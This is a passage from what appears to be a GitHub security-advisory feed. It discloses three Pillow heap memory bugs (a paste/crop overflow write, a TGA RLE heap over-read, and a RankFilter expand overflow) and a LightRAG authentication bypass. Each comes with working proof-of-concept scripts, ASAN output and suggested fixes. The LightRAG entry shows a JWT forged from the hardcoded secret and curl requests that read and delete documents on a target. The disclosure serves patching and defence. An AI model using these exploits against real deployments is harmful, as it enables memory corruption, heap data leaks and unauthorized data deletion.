<p>For the minimal PoC, this writes 8 attacker-controlled bytes 8 bytes before the
destination row allocation.</p>
<p>The primitive scales with the attacker-controlled source width:</p>
<pre><code class="language-text">source width = W
box = ((1 &lt;&lt; 31) - W, 0, INT_MIN, 1)

C destination offset = -4 * W
C memcpy size        =  4 * W
write range          = [row_start - 4W, row_start)
</code></pre>
<p>Examples for <code>RGBA</code>:</p>
<pre><code class="language-text">W = 2         -&gt; writes 8 bytes before the row
W = 1024      -&gt; writes 4096 bytes before the row
W = 65536     -&gt; writes 256 KiB before the row
W = 1000000   -&gt; writes about 4 MiB before the row
</code></pre>
<p>Pillow's image creation guard currently limits <code>xsize</code> to roughly
<code>INT_MAX / 4 - 1</code>, so the theoretical upper bound for this <code>RGBA</code> underwrite is
<code>2,147,483,640</code> bytes before the destination row pointer. In practice, the
usable range depends on memory availability, allocator layout, and process heap
state.</p>
<p>Two other documented APIs reach the same sink:</p>
<pre><code class="language-python"># Image.crop() path
left = INT_MIN + 2
Image.new("RGBA", (2, 1)).crop((left, 0, left + 2, 1))

# Image.alpha_composite() path, via its internal crop()
base = Image.new("RGBA", (2, 1))
over = Image.new("RGBA", (2, 1), (0x41, 0x42, 0x43, 0x44))
base.alpha_composite(over, dest=(left, 0))
</code></pre>
<p><code>Image.crop()</code> keeps <code>right - left</code> small, so the Python decompression-bomb
check allows it. <code>src/libImaging/Crop.c</code> then computes wrapped paste
coordinates and calls <code>ImagingPaste()</code>.</p>
<h3 id="poc">PoC</h3>
<p>The following standalone script exercises all three public API paths. Save it
as <code>b021_poc.py</code> and run it with <code>paste</code>, <code>crop</code>, or <code>alpha</code>.</p>
<pre><code class="language-python">#!/usr/bin/env python3
import argparse
import sys

from PIL import Image


INT_MIN = -(1 &lt;&lt; 31)


def rgba_pattern(width):
    out = bytearray()
    for i in range(width):
        out += bytes((0x41 + (i % 26), 0x42, 0x43, 0x44))
    return bytes(out)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "variant",
        choices=("paste", "crop", "alpha"),
        nargs="?",
        default="paste",
    )
    parser.add_argument("-w", "--width", type=int, default=2)
    args = parser.parse_args()

    width = args.width
    src = Image.frombytes("RGBA", (width, 1), rgba_pattern(width))

    if args.variant == "paste":
        box = ((1 &lt;&lt; 31) - width, 0, INT_MIN, 1)
        dst = Image.new("RGBA", (max(8, width), 1), (0, 0, 0, 0))
        print(f"variant=paste box={box}")
        print(f"expected C dst offset={-4 * width}, write_size={4 * width}")
        sys.stdout.flush()
        dst.paste(src, box)
        print("paste returned; first row:", dst.tobytes().hex())

    elif args.variant == "crop":
        left = INT_MIN + width
        box = (left, 0, left + width, 1)
        print(f"variant=crop box={box}")
        sys.stdout.flush()
        out = src.crop(box)
        print("crop returned; output:", out.tobytes().hex())

    else:
        dest = (INT_MIN + width, 0)
        dst = Image.new("RGBA", (max(8, width), 1), (0, 0, 0, 0))
        print(f"variant=alpha dest={dest}")
        sys.stdout.flush()
        dst.alpha_composite(src, dest=dest)
        print("alpha_composite returned; first row:", dst.tobytes().hex())

    sys.stdout.flush()


if __name__ == "__main__":
    main()
</code></pre>
<p>Run against an ASAN build:</p>
<pre><code class="language-bash">env ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \
  python b021_poc.py paste

env ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \
  python b021_poc.py crop

env ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \
  python b021_poc.py alpha
</code></pre>
<p>Observed ASAN signature for the direct <code>Image.paste()</code> path:</p>
<pre><code class="language-text">ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
paste /out/src/src/libImaging/Paste.c:59
ImagingPaste /out/src/src/libImaging/Paste.c:323
_paste /out/src/src/_imaging.c:1461
0x... is located 8 bytes before 32-byte region
</code></pre>
<p>On non-ASAN Pillow <code>12.2.0</code> and local <code>12.3.0.dev0</code>, the direct minimal
<code>Image.paste()</code> trigger returns from <code>paste()</code> and then the process aborts
during cleanup with:</p>
<pre><code class="language-text">double free or corruption (out)
Aborted (core dumped)
</code></pre>
<p>Observed ASAN signature for the <code>Image.crop()</code> and <code>Image.alpha_composite()</code>
paths:</p>
<pre><code class="language-text">ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
paste /out/src/src/libImaging/Paste.c:59
ImagingPaste /out/src/src/libImaging/Paste.c:323
ImagingCrop /out/src/src/libImaging/Crop.c:57
_crop /out/src/src/_imaging.c:1090
</code></pre>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Avoid signed overflow in paste/crop coordinate arithmetic. Use checked
arithmetic or a wider type before calculating widths and clipped endpoints.</p>
<p>For example, reject boxes whose endpoint subtraction cannot be represented
cleanly, and clip using non-overflowing comparisons:</p>
<pre><code class="language-c">int64_t xsize64 = (int64_t)dx1 - dx0;
int64_t ysize64 = (int64_t)dy1 - dy0;

if (xsize64 &lt; 0 || ysize64 &lt; 0 || xsize64 &gt; INT_MAX || ysize64 &gt; INT_MAX) {
    return ImagingError_ValueError("bad box");
}
</code></pre>
<p><code>ImagingCrop()</code> should receive the same treatment for <code>sx1 - sx0</code>,
<code>dx0 = -sx0</code>, and <code>dx1 = imIn-&gt;xsize - sx0</code>.</p>
<h3 id="impact">Impact</h3>
<p>This is a heap out-of-bounds write in Pillow's native C extension, reachable
through documented public image APIs.</p>
<p>Applications are impacted if an untrusted user can control image operation
coordinates passed to Pillow, for example crop boxes, paste boxes, or overlay
positions. The bytes written in the direct <code>Image.paste()</code> variant are copied
from the source image, so attacker-controlled source pixels can influence the
out-of-bounds write. For <code>RGBA</code>, the write is a backward heap underwrite whose
offset and length are both <code>4 * source_width</code>, bounded in practice by successful
image allocation and heap layout.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-6r8x-57c9-28j4">https://github.com/python-pillow/Pillow/security/advisories/GHSA-6r8x-57c9-28j4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59199">https://nvd.nist.gov/vuln/detail/CVE-2026-59199</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9703">https://github.com/python-pillow/Pillow/pull/9703</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/ceefc348eb3c3844c7f9796ef2cc3a7dd5fbba7b">https://github.com/python-pillow/Pillow/commit/ceefc348eb3c3844c7f9796ef2cc3a7dd5fbba7b</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3451.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3451.yaml</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6r8x-57c9-28j4">https://github.com/advisories/GHSA-6r8x-57c9-28j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6r8x-57c9-28j4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T23:09:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pillow] Pillow TGA RLE encoder can serialize up to ~57 KB of adjacent heap data into generated images]]></title>
        <id>https://github.com/advisories/GHSA-fj7v-r99m-22gq</id>
        <link href="https://github.com/advisories/GHSA-fj7v-r99m-22gq"/>
        <updated>2026-07-20T23:09:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pillow's TGA RLE encoder reads past its row buffer when saving a mode <code>"1"</code>
image. Adjacent process heap bytes can be copied into the generated TGA file.</p>
<p>The bug is reachable through the public save API:</p>
<pre><code class="language-python">im.save(out, format="TGA", compression="tga_rle")
</code></pre>
<p>Older affected Pillow versions use the equivalent public option <code>rle=True</code>.</p>
<p>For mode <code>"1"</code>, Pillow allocates a packed row buffer of <code>ceil(width / 8)</code>
bytes, but <code>ImagingTgaRleEncode()</code> treats the row as one full byte per pixel.</p>
<p>The maximum valid TGA width is <code>65535</code>. At that width:</p>
<pre><code class="language-text">allocated packed row buffer: 8192 bytes
encoder byte-offset walk:     65535 bytes
maximum OOB window per row:   57343 bytes
</code></pre>
<p>On non-ASAN Pillow <code>12.2.0</code>, the public-only maximum-width PoC below serialized
<code>57297</code> bytes from distinct out-of-bounds source offsets into one returned TGA,
covering <code>99.92%</code> of the maximum adjacent heap window. No heap grooming, ctypes,
private API, or malformed input file was used. The disclosure is emitted across
many TGA packet payload copies of at most <code>128</code> bytes each, not one large
<code>memcpy()</code>.</p>
<h3 id="details">Details</h3>
<p><code>src/PIL/TgaImagePlugin.py</code> allows mode <code>"1"</code> TGA output and selects the
<code>tga_rle</code> encoder when RLE compression is requested.</p>
<p><code>src/encode.c:_setimage()</code> allocates the row buffer using the packed-bit
formula:</p>
<pre><code class="language-c">state-&gt;bytes = (state-&gt;bits * state-&gt;xsize + 7) / 8;
state-&gt;buffer = (UINT8 *)calloc(1, state-&gt;bytes);
</code></pre>
<p>For mode <code>"1"</code>, <code>state-&gt;bits == 1</code>.</p>
<p><code>src/libImaging/TgaRleEncode.c</code> then computes:</p>
<pre><code class="language-c">bytesPerPixel = (state-&gt;bits + 7) / 8;
</code></pre>
<p>This becomes <code>1</code>, and the encoder uses pixel indexes as byte offsets:</p>
<pre><code class="language-c">static int
comparePixels(const UINT8 *buf, int x, int bytesPerPixel) {
    buf += x * bytesPerPixel;
    return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0;
}
</code></pre>
<p>The packet payload <code>memcpy()</code> later copies those out-of-bounds source bytes into
the output. Raw packets copy up to <code>128</code> contiguous bytes, while RLE packets copy
one representative byte:</p>
<pre><code class="language-c">memcpy(
    dst, state-&gt;buffer + (state-&gt;x * bytesPerPixel - state-&gt;count), flushCount
);
</code></pre>
<p>A width-2 mode <code>"1"</code> image allocates one row byte and already triggers an ASAN
heap-buffer-overflow read. Wider images increase the adjacent heap window and
the amount of heap data that can be serialized.</p>
<h3 id="poc">PoC</h3>
<h4 id="minimal-asan-trigger">Minimal ASAN trigger</h4>
<pre><code class="language-python">import io
from PIL import Image

out = io.BytesIO()
Image.new("1", (2, 1)).save(out, format="TGA", compression="tga_rle")
</code></pre>
<p>Observed on local Pillow <code>12.3.0.dev0</code> ASAN target:</p>
<pre><code class="language-text">ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
comparePixels /out/src/src/libImaging/TgaRleEncode.c:10
ImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81
0 bytes after a 1-byte allocation from _setimage
</code></pre>
<h4 id="maximum-width-heap-disclosure">Maximum-width heap disclosure</h4>
<p>This PoC uses one maximum-width row. It parses the generated TGA packets and
extracts only payload bytes whose source offsets were outside the allocated
packed row. Rows are  avoided because they mostly repeat the same adjacent heap window.</p>
<p>Run the following with a standard affected Pillow installation.</p>
<pre><code class="language-python">import hashlib
import io
import PIL
from PIL import Image

WIDTH = 65535
ATTEMPTS = 20
ROW_BYTES = (WIDTH + 7) // 8
MAX_OOB_WINDOW = WIDTH - ROW_BYTES

def extract_oob_payload(data):
    i = 18
    pixel = 0
    oob = bytearray()

    while pixel &lt; WIDTH:
        descriptor = data[i]
        i += 1
        count = (descriptor &amp; 0x7F) + 1

        if descriptor &amp; 0x80:
            value = data[i]
            i += 1
            if pixel + count - 1 &gt;= ROW_BYTES:
                oob.append(value)
        else:
            values = data[i : i + count]
            i += count
            oob.extend(values[max(ROW_BYTES - pixel, 0) :])

        pixel += count

    return bytes(oob)


best = b""

for _ in range(ATTEMPTS):
    out = io.BytesIO()
    Image.new("1", (WIDTH, 1), 0).save(out, format="TGA", compression="tga_rle")
    oob = extract_oob_payload(out.getvalue())
    if len(oob) &gt; len(best):
        best = oob

with open("/tmp/max_oob_bytes.bin", "wb") as fp:
    fp.write(best)

print(f"Pillow={PIL.__version__}")
print(f"packed_row_bytes={ROW_BYTES}")
print(f"maximum_oob_window={MAX_OOB_WINDOW}")
print(f"serialized_distinct_oob_offsets={len(best)}")
print(f"nonzero_oob_bytes={sum(byte != 0 for byte in best)}")
print(f"coverage={len(best) / MAX_OOB_WINDOW:.2%}")
print(f"sha256={hashlib.sha256(best).hexdigest()}")
</code></pre>
<p>Observed on installed Pillow <code>12.2.0</code>:</p>
<pre><code class="language-text">Pillow=12.2.0
packed_row_bytes=8192
maximum_oob_window=57343
serialized_distinct_oob_offsets=57297
nonzero_oob_bytes=54407
coverage=99.92%
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a heap out-of-bounds read and potential information disclosure.</p>
<p>A maximum-width single-row image can cause nearly the full
<code>57343</code>-byte adjacent heap window to be incorporated into one output file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-fj7v-r99m-22gq">https://github.com/python-pillow/Pillow/security/advisories/GHSA-fj7v-r99m-22gq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59198">https://nvd.nist.gov/vuln/detail/CVE-2026-59198</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9709">https://github.com/python-pillow/Pillow/pull/9709</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/eada3cbd7fb9963ee90673fb7b5270124a0d5f4b">https://github.com/python-pillow/Pillow/commit/eada3cbd7fb9963ee90673fb7b5270124a0d5f4b</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-fj7v-r99m-22gq">https://github.com/advisories/GHSA-fj7v-r99m-22gq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj7v-r99m-22gq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T23:09:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pillow] Pillow: Heap out-of-bounds write in `ImageFilter.RankFilter` via integer overflow in `ImagingExpand`]]></title>
        <id>https://github.com/advisories/GHSA-xj96-63gp-2gmr</id>
        <link href="https://github.com/advisories/GHSA-xj96-63gp-2gmr"/>
        <updated>2026-07-20T23:08:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pillow's public rank-filter API can trigger a native heap out-of-bounds write
when given a very large odd filter size.</p>
<p>Minimal public API trigger:</p>
<pre><code class="language-python">from PIL import Image, ImageFilter

im = Image.new("L", (3, 3), 128)
im.filter(ImageFilter.MedianFilter(4294967295))
</code></pre>
<p><code>ImageFilter.RankFilter.filter()</code> calls <code>image.expand(size // 2, size // 2)</code>
before rank-filter size validation. With <code>size = 4294967295</code>, the
expansion margin is <code>2147483647</code> (<code>INT_MAX</code>). <code>ImagingExpand()</code> then computes
the output dimensions with unchecked signed <code>int</code> arithmetic. On tested builds,
this wraps to a tiny output image and the border-expansion loop writes past the
allocation.</p>
<p>This is reachable through documented public classes (<code>RankFilter</code>,
<code>MedianFilter</code>, <code>MinFilter</code>, and <code>MaxFilter</code>). No private API, ctypes, or custom
Python object is needed.</p>
<h3 id="details">Details</h3>
<p>Current <code>src/PIL/ImageFilter.py</code>:</p>
<pre><code class="language-python">class RankFilter(Filter):
    def filter(self, image):
        if image.mode == "P":
            msg = "cannot filter palette images"
            raise ValueError(msg)
        image = image.expand(self.size // 2, self.size // 2)
        return image.rankfilter(self.size, self.rank)
</code></pre>
<p>The <code>expand()</code> call is made before <code>image.rankfilter(...)</code>.</p>
<p>Current <code>src/libImaging/Filter.c:ImagingExpand()</code> does not check output-size
overflow:</p>
<pre><code class="language-c">if (xmargin &lt; 0 &amp;&amp; ymargin &lt; 0) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}

imOut = ImagingNewDirty(
    imIn-&gt;mode, imIn-&gt;xsize + 2 * xmargin, imIn-&gt;ysize + 2 * ymargin
);
</code></pre>
<p>For a <code>3x3</code> image and <code>xmargin = ymargin = INT_MAX</code>, the computed output size
wraps to <code>1x1</code> on tested builds. The following loop still uses the huge margin:</p>
<pre><code class="language-c">for (x = 0; x &lt; xmargin; x++) {
    imOut-&gt;image[yout][x] = imIn-&gt;image[yin][0];
}
</code></pre>
<p><code>src/libImaging/RankFilter.c</code> does contain checks that would reject this size:</p>
<pre><code class="language-c">if (!(size &amp; 1)) {
    return (Imaging)ImagingError_ValueError("bad filter size");
}
if (size &gt; INT_MAX / size || size &gt; INT_MAX / (size * (int)sizeof(FLOAT32))) {
    return (Imaging)ImagingError_ValueError("filter size too large");
}
</code></pre>
<p>But  those checks are reached only after <code>RankFilter.filter()</code> has already
called <code>image.expand(...)</code>.</p>
<p>Mode <code>"L"</code> produces 1-byte OOB stores. Modes <code>"I"</code> and <code>"F"</code> produce 4-byte OOB
stores. The repeated value written OOB is copied from the source image border
pixel, so attacker-supplied image bytes can influence it. This is a sequential
overwrite, not an arbitrary-address write.</p>
<h3 id="poc">PoC</h3>
<p>Minimal ASAN crash PoC:</p>
<pre><code class="language-python">from PIL import Image, ImageFilter

im = Image.new("L", (3, 3), 128)
im.filter(ImageFilter.MedianFilter(4294967295))
</code></pre>
<p>Observed on local Pillow <code>12.3.0.dev0</code> ASAN target:</p>
<pre><code class="language-text">ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1
ImagingExpand /out/src/src/libImaging/Filter.c:99
_expand_image /out/src/src/_imaging.c:1100
0 bytes after a 1-byte allocation
</code></pre>
<p>4-byte write variant with source pixel loaded from normal image bytes:</p>
<pre><code class="language-python">from io import BytesIO
from PIL import Image, ImageFilter

SIZE = 4294967295
PIXEL = 0x41424344

src = BytesIO()
Image.new("I", (3, 3), PIXEL).save(src, format="TIFF")

im = Image.open(BytesIO(src.getvalue()))
im.load()
assert im.mode == "I"
assert im.getpixel((0, 0)) == PIXEL

im.filter(ImageFilter.MedianFilter(SIZE))
</code></pre>
<p>Observed ASAN signature:</p>
<pre><code class="language-text">ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 4
ImagingExpand /out/src/src/libImaging/Filter.c:101
_expand_image /out/src/src/_imaging.c:1100
0 bytes after a 4-byte allocation
</code></pre>
<p>Version checks:</p>
<pre><code class="language-text">Pillow 1.0: ASAN heap-buffer-overflow WRITE confirmed at runtime
Pillow 12.3.0.dev0: ASAN heap-buffer-overflow WRITE confirmed at runtime
Pillow 1.0 through 12.2.0: source sweep confirmed the vulnerable public
                           validation order and unchecked ImagingExpand arithmetic
upstream/main at 9c1097c861420c77af53c7c9af2a1382e2bfaa8b: still affected
</code></pre>
<h3 id="impact">Impact</h3>
<p>It is a heap out-of-bounds write in Pillow's native C extension, reachable
through public image-filter classes.</p>
<p>Applications are impacted if an untrusted user can control the rank-filter
size/configuration passed to Pillow. If the image is also attacker-supplied, the
source pixel value written out of bounds can be attacker-influenced, including
4-byte values for mode <code>"I"</code> images.</p>
<h2 id="possible-fix">Possible fix</h2>
<p>Validate the rank-filter size before calling <code>image.expand(...)</code>, and harden
<code>ImagingExpand()</code> against invalid margins and overflow:</p>
<pre><code class="language-c">if (xmargin &lt; 0 || ymargin &lt; 0) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}
if (xmargin &gt; (INT_MAX - imIn-&gt;xsize) / 2 ||
    ymargin &gt; (INT_MAX - imIn-&gt;ysize) / 2) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr">https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59197">https://nvd.nist.gov/vuln/detail/CVE-2026-59197</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9695">https://github.com/python-pillow/Pillow/pull/9695</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1">https://github.com/python-pillow/Pillow/commit/cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-xj96-63gp-2gmr">https://github.com/advisories/GHSA-xj96-63gp-2gmr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xj96-63gp-2gmr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T23:08:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightrag-hku] LightRAG is Vulnerable to Authentication Bypass: hardcoded DEFAULT_TOKEN_SECRET and public /auth-status defeat LIGHTRAG_API_KEY protection]]></title>
        <id>https://github.com/advisories/GHSA-f4vv-55c2-5789</id>
        <link href="https://github.com/advisories/GHSA-f4vv-55c2-5789"/>
        <updated>2026-07-20T21:46:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When LightRAG is deployed with <code>LIGHTRAG_API_KEY</code> set but <code>AUTH_ACCOUNTS</code> unset (an officially documented "API-Key authentication" mode), the <code>X-API-Key</code> protection can be bypassed by any remote unauthenticated attacker. The bypass does not require network contact with the victim server — an attacker can mint a valid guest JWT offline using the hardcoded <code>DEFAULT_TOKEN_SECRET</code> committed in the repository and then call any endpoint guarded by <code>Depends(combined_auth)</code>, including destructive operations such as <code>DELETE /documents</code>, <code>POST /documents/upload</code>, <code>/documents/clear_cache</code>, and <code>POST /query</code>.</p>
<p>This is distinct from the previously-fixed GHSA-mcww-4hxq-hfr3 / CVE-2026-30762, which only covered the <code>AUTH_ACCOUNTS</code>-configured case. The API-Key-only deployment profile is still fully exploitable on current <code>main</code> (commit <code>157c331</code>, v1.4.15).</p>
<h2 id="root-cause">Root cause</h2>
<p>Three independent issues combine:</p>
<ol>
<li><code>lightrag/api/config.py:54</code> ships a hardcoded default JWT secret:<pre><code class="language-python">DEFAULT_TOKEN_SECRET="lightr...key!"
</code></pre>
</li>
<li><code>lightrag/api/auth.py:28-38</code> falls back to <code>DEFAULT_TOKEN_SECRET</code> with only a warning log when <code>AUTH_ACCOUNTS</code> is not configured. The fix for CVE-2026-30762 only raises when <code>AUTH_ACCOUNTS</code> is set, so the API-key-only path is silently vulnerable.</li>
<li><code>lightrag/api/lightrag_server.py:1140-1186</code> exposes <code>GET /auth-status</code> and <code>POST /login</code> without any authentication dependency. In the API-key-only configuration, <code>auth_handler.accounts</code> is empty, and both endpoints unconditionally mint and return a signed guest JWT.</li>
<li><code>lightrag/api/utils_api.py:214-216</code> inside <code>combined_dependency</code> short-circuits authorization on any valid guest token when <code>auth_configured</code> is false, <strong>before</strong> reaching the <code>X-API-Key</code> check on line 237:<pre><code class="language-python">if not auth_configured and token_info.get("role") == "guest":
    return
</code></pre>
</li>
</ol>
<h2 id="proof-of-concept-offline-minted-token-zero-server-contact">Proof of concept (offline-minted token, zero server contact)</h2>
<p>Tested against a clean install of commit <code>157c331</code> running locally with only <code>LIGHTRAG_API_KEY=super-...ass</code> configured.</p>
<pre><code class="language-bash">$ python3 - &lt;&lt;'PY'
import jwt
from datetime import datetime, timedelta, timezone
print(jwt.encode(
    {"sub":"guest","role":"guest",
     "exp":datetime.now(timezone.utc)+timedelta(hours=24),
     "metadata":{"auth_mode":"disabled"}},
    "lightrag-jwt-default-secret-key!",
    algorithm="HS256"))
PY
eyJhbGci...

# Control — no creds: correctly rejected
$ curl -s -w "HTTP %{http_code}\n" http://target:9876/documents
{"detail":"API Key required"}
HTTP 403

# Control — wrong API key: correctly rejected
$ curl -s -w "HTTP %{http_code}\n" -H "X-API-Key: wrong-key" http://target:9876/documents
{"detail":"Invalid API Key"}
HTTP 403

# Bypass — offline-minted guest JWT: accepted
$ curl -s -w "HTTP %{http_code}\n" -H "Authorization: Bearer *** \
    http://target:9876/documents
{"statuses":{}}
HTTP 200

# Destructive confirmation — DELETE /documents with the same token
$ curl -s -X DELETE -w "HTTP %{http_code}\n" -H "Authorization: Bearer *** \
    http://target:9876/documents
{"status":"success","message":"All documents cleared successfully. Deleted 0 files."}
HTTP 200
</code></pre>
<p>The guest JWT also does not need to be minted offline — <code>GET /auth-status</code> hands one out to anyone, even when the server is started with <code>LIGHTRAG_API_KEY</code> set. Either path (offline or <code>/auth-status</code>) yields the same bypass.</p>
<h2 id="impact">Impact</h2>
<p>Any LightRAG instance that is reachable on the network and configured with:</p>
<ul>
<li><code>LIGHTRAG_API_KEY</code> set (i.e. the operator believes the server is protected), and</li>
<li><code>AUTH_ACCOUNTS</code> unset (i.e. they opted out of the password-based login flow)</li>
</ul>
<p>is fully accessible to any anonymous caller. This configuration is documented as the "simple API-Key authentication" mode in <code>docs/LightRAG-API-Server.md</code>, so it is expected to be common in production. An attacker can:</p>
<ul>
<li>Read and delete arbitrary documents (<code>/documents</code>, <code>DELETE /documents</code>)</li>
<li>Upload arbitrary documents and text for ingestion (<code>/documents/upload</code>, <code>/documents/text</code>, <code>/documents/texts</code>, <code>/documents/file_batch</code>, <code>/documents/scan</code>)</li>
<li>Clear LLM / embedding caches (<code>/documents/clear_cache</code>)</li>
<li>Inspect and mutate the knowledge graph (<code>/graph/*</code>)</li>
<li>Run arbitrary queries that will consume paid LLM / embedding credits (<code>/query</code>, <code>/query/stream</code>)</li>
</ul>
<p>Because the server may be exposed behind corporate reverse proxies that trust <code>LIGHTRAG_API_KEY</code>, this also lets the attacker bypass perimeter authentication that the operator assumed was sufficient.</p>
<h2 id="suggested-cvss">Suggested CVSS</h2>
<p>7.5 — <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L</code> (High). Unauthenticated, network-reachable, affects confidentiality and integrity of all ingested documents and knowledge graphs; availability impact via cache wipes and credit exhaustion.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Any one of the following individually closes the primary vector; all three are recommended for defense in depth:</p>
<ol>
<li><strong>Remove the hardcoded fallback.</strong> Mirror the fix for CVE-2026-30762: refuse to start (or emit a randomly-generated ephemeral secret that is not exported) whenever <code>TOKEN_SECRET</code> is unset, regardless of <code>AUTH_ACCOUNTS</code>.</li>
<li><strong>Gate <code>/auth-status</code> and <code>/login</code> when <code>LIGHTRAG_API_KEY</code> is set.</strong> Either require <code>Depends(combined_auth)</code> or stop minting guest tokens whenever <code>api_key_configured</code> is true.</li>
<li><strong>Fix the short-circuit in <code>combined_dependency</code>.</strong> Do not accept guest tokens as authentication when <code>api_key_configured</code> is true; always require a valid <code>X-API-Key</code> header in that configuration.</li>
</ol>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li><code>main</code> through commit <code>157c331</code> (2026-04-15)</li>
<li>Most recent release v1.4.15 and all prior releases that ship the API-Key-only code path</li>
</ul>
<h2 id="prior-art-checked">Prior art checked</h2>
<ul>
<li>GHSA-8ffj-4hx4-9pgf / CVE-2026-39413 — JWT <code>alg:none</code>. Unrelated.</li>
<li>GHSA-mcww-4hxq-hfr3 / CVE-2026-30762 — hardcoded JWT secret combined with <code>AUTH_ACCOUNTS</code>. Fixed by PR #2869, which explicitly does <strong>not</strong> cover the API-Key-only configuration.</li>
<li>Issues/PRs searched: "guest token bypass", "DEFAULT_TOKEN_SECRET", "hardcoded secret", "auth-status", "api key bypass". No prior report covering this vector.</li>
</ul>
<h2 id="discovery">Discovery</h2>
<p>Found during an external security review of LightRAG's API authentication flow. Reporter can be credited publicly as "patchmyday (Jason Zhang)" upon disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HKUDS/LightRAG/security/advisories/GHSA-f4vv-55c2-5789">https://github.com/HKUDS/LightRAG/security/advisories/GHSA-f4vv-55c2-5789</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61740">https://nvd.nist.gov/vuln/detail/CVE-2026-61740</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/pull/3319">https://github.com/HKUDS/LightRAG/pull/3319</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/f7819aa3a49a9d8d92eed8251d82d6ebcafa8cba">https://github.com/HKUDS/LightRAG/commit/f7819aa3a49a9d8d92eed8251d82d6ebcafa8cba</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4">https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-f4vv-55c2-5789">https://github.com/advisories/GHSA-f4vv-55c2-5789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4vv-55c2-5789</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-20T21:46:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightrag-hku] LightRAG: CORS Wildcard + Credentials Enables Any-Origin Credentialed Requests]]></title>
        <id>https://github.com/advisories/GHSA-6x6h-qqr7-855w</id>
        <link href="https://github.com/advisories/GHSA-6x6h-qqr7-855w"/>
        <updated>2026-07-20T21:45:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
